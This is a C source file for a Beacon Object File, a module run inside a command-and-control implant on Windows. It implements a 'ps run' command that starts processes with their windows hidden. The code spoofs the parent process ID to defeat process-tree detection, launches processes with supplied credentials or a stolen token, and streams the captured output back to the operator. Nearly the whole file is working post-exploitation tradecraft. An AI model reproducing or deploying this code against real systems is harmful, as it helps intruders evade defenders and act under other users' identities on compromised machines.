#include <windows.h>
#include "bofdefs.h"
#include "beacon.h"

/* -------------------------------------------------------------------------
 * Method constants (matches Phase 26 ps.axs packing order)
 * -----------------------------------------------------------------------*/
#define CREATE_METHOD_DEFAULT  0   /* CreateProcessW */
#define CREATE_METHOD_LOGON    1   /* CreateProcessWithLogonW */
#define CREATE_METHOD_TOKEN    2   /* CreateProcessWithTokenW */

/* Fallback defines for older MinGW toolchains */
#ifndef EXTENDED_STARTUPINFO_PRESENT
#define EXTENDED_STARTUPINFO_PRESENT 0x00080000
#endif
#ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS ((DWORD_PTR)(0x00020002))
#endif
#ifndef LOGON_WITH_PROFILE
#define LOGON_WITH_PROFILE 0x00000001
#endif
#ifndef CREATE_NO_WINDOW
#define CREATE_NO_WINDOW 0x08000000
#endif

/* -------------------------------------------------------------------------
 * Argument struct — local to run.c only
 * -----------------------------------------------------------------------*/
typedef struct {
    int     method;    /* CREATE_METHOD_* */
    DWORD   state;     /* 0 or CREATE_SUSPENDED */
    int     pipe;      /* 0=no capture, 1=capture stdout/stderr */
    int     ppid;      /* 0=no spoofing, nonzero=target parent PID */
    HANDLE  token;     /* WithToken method */
    WCHAR  *argument;  /* lpCommandLine (raw pointer into args buffer) */
    WCHAR  *domain;    /* WithLogon */
    WCHAR  *username;  /* WithLogon */
    WCHAR  *password;  /* WithLogon */
} PS_RUN_ARGS;

/* -------------------------------------------------------------------------
 * fmt_err — human-readable Win32 error via FormatMessageA (D-05)
 * -----------------------------------------------------------------------*/
static void fmt_err(const char *prefix, DWORD code)
{
    LPSTR msg = NULL;
    KERNEL32$FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM |
        FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL, code,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPSTR)&msg, 0, NULL);
    BeaconPrintf(CALLBACK_ERROR, "%s (%lu): %s\n",
                 prefix, (unsigned long)code, msg ? msg : "");
    if (msg) KERNEL32$LocalFree(msg);
}

/* -------------------------------------------------------------------------
 * read_pipe_output — simple blocking ReadFile loop (D-04)
 * Streams captured output directly to beacon; no growing buffer needed.
 * -----------------------------------------------------------------------*/
static void read_pipe_output(HANDLE pipe_read)
{
    char   buf[4096];
    DWORD  bytes_read = 0;
    while (KERNEL32$ReadFile(pipe_read, buf, sizeof(buf), &bytes_read, NULL)
           && bytes_read > 0)
    {
        BeaconOutput(CALLBACK_OUTPUT, buf, (int)bytes_read);
    }
}

/* -------------------------------------------------------------------------
 * go — BOF entry point
 * Arg parse order (must match ps.axs packing in Phase 26):
 *   method (int), command (wstr), state (int), pipe (int), ppid (int),
 *   domain (wstr), username (wstr), password (wstr), token (int/HANDLE)
 * -----------------------------------------------------------------------*/
void go(char *args, int len)
{
    datap            parser;
    PS_RUN_ARGS      a;
    PROCESS_INFORMATION pi;
    STARTUPINFOEXW   siex;
    STARTUPINFOW     si;
    SECURITY_ATTRIBUTES sa;
    HANDLE           pipe_read    = NULL;
    HANDLE           pipe_write   = NULL;
    HANDLE           pipe_dup     = NULL;
    HANDLE           parent_handle= NULL;
    PVOID            attribute_buff = NULL;
    SIZE_T           attribute_size = 0;
    DWORD            creation_flags;
    DWORD            err;
    BOOL             success      = FALSE;
    LPSTARTUPINFOW   psi          = NULL;
    /* Writable command-line copy (CreateProcessW may modify lpCommandLine) */
    WCHAR            cmd_buf[32768];

    /* Zero-init everything */
    memset(&a,    0, sizeof(a));
    memset(&pi,   0, sizeof(pi));
    memset(&siex, 0, sizeof(siex));
    memset(&si,   0, sizeof(si));
    memset(&sa,   0, sizeof(sa));
    memset(cmd_buf, 0, sizeof(cmd_buf));

    /* ---- Parse beacon args ---- */
    BeaconDataParse(&parser, args, len);
    a.method   =       BeaconDataInt(&parser);
    a.argument = (WCHAR*)BeaconDataExtract(&parser, NULL);
    a.state    =       BeaconDataInt(&parser);  /* nonzero → CREATE_SUSPENDED */
    a.pipe     =       BeaconDataInt(&parser);
    a.ppid     =       BeaconDataInt(&parser);
    a.domain   = (WCHAR*)BeaconDataExtract(&parser, NULL);
    a.username = (WCHAR*)BeaconDataExtract(&parser, NULL);
    a.password = (WCHAR*)BeaconDataExtract(&parser, NULL);
    a.token    = (HANDLE)(ULONG_PTR)BeaconDataInt(&parser);

    /* Copy command to writable buffer */
    if (a.argument) {
        int wlen = KERNEL32$lstrlenW(a.argument);
        if (wlen >= (int)(sizeof(cmd_buf) / sizeof(WCHAR))) {
            BeaconPrintf(CALLBACK_ERROR, "ps run: command too long\n");
            return;
        }
        memcpy(cmd_buf, a.argument, (wlen + 1) * sizeof(WCHAR));
    }

    /* ---- Base creation flags ---- */
    creation_flags = CREATE_NO_WINDOW;
    if (a.state) creation_flags |= CREATE_SUSPENDED;

    /* ---- Setup startup info based on method ---- */
    if (a.method == CREATE_METHOD_DEFAULT) {
        /* STARTUPINFOEXW path — supports PPID spoofing */
        siex.StartupInfo.cb        = sizeof(STARTUPINFOEXW);
        siex.StartupInfo.dwFlags   = STARTF_USESHOWWINDOW;
        siex.StartupInfo.wShowWindow = SW_HIDE;
        psi = &siex.StartupInfo;

        if (a.ppid) {
            /* Size probe */
            KERNEL32$InitializeProcThreadAttributeList(NULL, 1, 0, &attribute_size);
            attribute_buff = MSVCRT$malloc(attribute_size);
            if (!attribute_buff) {
                BeaconPrintf(CALLBACK_ERROR, "ps run: failed to allocate attribute list\n");
                goto cleanup;
            }
            if (!KERNEL32$InitializeProcThreadAttributeList(
                    (LPPROC_THREAD_ATTRIBUTE_LIST)attribute_buff, 1, 0, &attribute_size)) {
                err = KERNEL32$GetLastError();
                fmt_err("ps run: InitializeProcThreadAttributeList failed", err);
                goto cleanup;
            }

            /* Open the target parent — needs PROCESS_DUP_HANDLE for pipe dup */
            parent_handle = KERNEL32$OpenProcess(
                PROCESS_CREATE_PROCESS | PROCESS_DUP_HANDLE, FALSE, (DWORD)a.ppid);
            if (!parent_handle) {
                err = KERNEL32$GetLastError();
                fmt_err("ps run: OpenProcess (PPID) failed", err);
                goto cleanup;
            }

            if (!KERNEL32$UpdateProcThreadAttribute(
                    (LPPROC_THREAD_ATTRIBUTE_LIST)attribute_buff, 0,
                    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    &parent_handle, sizeof(HANDLE), NULL, NULL)) {
                err = KERNEL32$GetLastError();
                fmt_err("ps run: UpdateProcThreadAttribute failed", err);
                goto cleanup;
            }

            siex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)attribute_buff;
            creation_flags |= EXTENDED_STARTUPINFO_PRESENT;
        }
    } else {
        /* Plain STARTUPINFOW — WithLogon and WithToken do not support attribute lists */
        si.cb          = sizeof(STARTUPINFOW);
        si.dwFlags     = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        psi = &si;
    }

    /* ---- Setup anonymous pipe if capture requested ---- */
    if (a.pipe) {
        sa.nLength              = sizeof(SECURITY_ATTRIBUTES);
        sa.lpSecurityDescriptor = NULL;
        sa.bInheritHandle       = TRUE;  /* child inherits write end */

        if (!KERNEL32$CreatePipe(&pipe_read, &pipe_write, &sa, 0)) {
            err = KERNEL32$GetLastError();
            fmt_err("ps run: CreatePipe failed", err);
            goto cleanup;
        }
        /* Prevent child from inheriting the read end */
        KERNEL32$SetHandleInformation(pipe_read, HANDLE_FLAG_INHERIT, 0);

        if (a.method == CREATE_METHOD_DEFAULT && a.ppid && parent_handle) {
            /*
             * PPID + pipe combined: with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
             * active, the child inherits handles from the *spoofed parent's*
             * handle table, not ours. Duplicate pipe_write into the parent
             * so the child can inherit it. (Confirmed from Kharon lines 268-277)
             */
            if (!KERNEL32$DuplicateHandle(
                    KERNEL32$GetCurrentProcess(), pipe_write,
                    parent_handle, &pipe_dup,
                    0, TRUE, DUPLICATE_SAME_ACCESS)) {
                err = KERNEL32$GetLastError();
                fmt_err("ps run: DuplicateHandle (pipe into parent) failed", err);
                goto cleanup;
            }
            KERNEL32$CloseHandle(pipe_write);
            pipe_write = pipe_dup;
            pipe_dup   = NULL;
        }

        /* Wire pipe into startup info */
        if (a.method == CREATE_METHOD_DEFAULT) {
            siex.StartupInfo.dwFlags   |= STARTF_USESTDHANDLES;
            siex.StartupInfo.hStdOutput = pipe_write;
            siex.StartupInfo.hStdError  = pipe_write;
            siex.StartupInfo.hStdInput  = KERNEL32$GetStdHandle(STD_INPUT_HANDLE);
        } else {
            si.dwFlags   |= STARTF_USESTDHANDLES;
            si.hStdOutput = pipe_write;
            si.hStdError  = pipe_write;
            si.hStdInput  = KERNEL32$GetStdHandle(STD_INPUT_HANDLE);
        }
    }

    /* ---- Launch the process ---- */
    switch (a.method) {
    case CREATE_METHOD_DEFAULT:
        success = KERNEL32$CreateProcessW(
            NULL, cmd_buf, NULL, NULL, TRUE,
            creation_flags, NULL, NULL,
            psi, &pi);
        break;

    case CREATE_METHOD_LOGON:
        success = ADVAPI32$CreateProcessWithLogonW(
            a.username, a.domain, a.password,
            LOGON_WITH_PROFILE,
            NULL, cmd_buf, creation_flags,
            NULL, NULL,
            psi, &pi);
        break;

    case CREATE_METHOD_TOKEN:
        success = ADVAPI32$CreateProcessWithTokenW(
            a.token, LOGON_WITH_PROFILE,
            NULL, cmd_buf, creation_flags,
            NULL, NULL,
            psi, &pi);
        break;

    default:
        BeaconPrintf(CALLBACK_ERROR,
                     "ps run: unknown method %d (0=default,1=logon,2=token)\n",
                     a.method);
        goto cleanup;
    }

    if (!success) {
        err = KERNEL32$GetLastError();
        fmt_err("ps run: CreateProcess failed", err);
        goto cleanup;
    }

    /*
     * Close write end BEFORE the ReadFile loop — otherwise ReadFile never
     * gets EOF because the write end remains open in our handle table.
     */
    if (pipe_write) {
        KERNEL32$CloseHandle(pipe_write);
        pipe_write = NULL;
    }

    /* Capture stdout/stderr if pipe was requested */
    if (a.pipe && pipe_read) {
        read_pipe_output(pipe_read);
    }

    BeaconPrintf(CALLBACK_OUTPUT,
                 "Process started: PID %lu, TID %lu\n",
                 (unsigned long)pi.dwProcessId,
                 (unsigned long)pi.dwThreadId);

    KERNEL32$CloseHandle(pi.hProcess);
    KERNEL32$CloseHandle(pi.hThread);

cleanup:
    if (attribute_buff) {
        KERNEL32$DeleteProcThreadAttributeList(
            (LPPROC_THREAD_ATTRIBUTE_LIST)attribute_buff);
        MSVCRT$free(attribute_buff);
    }
    if (pipe_read)     KERNEL32$CloseHandle(pipe_read);
    if (pipe_write)    KERNEL32$CloseHandle(pipe_write);
    if (parent_handle) KERNEL32$CloseHandle(parent_handle);
}
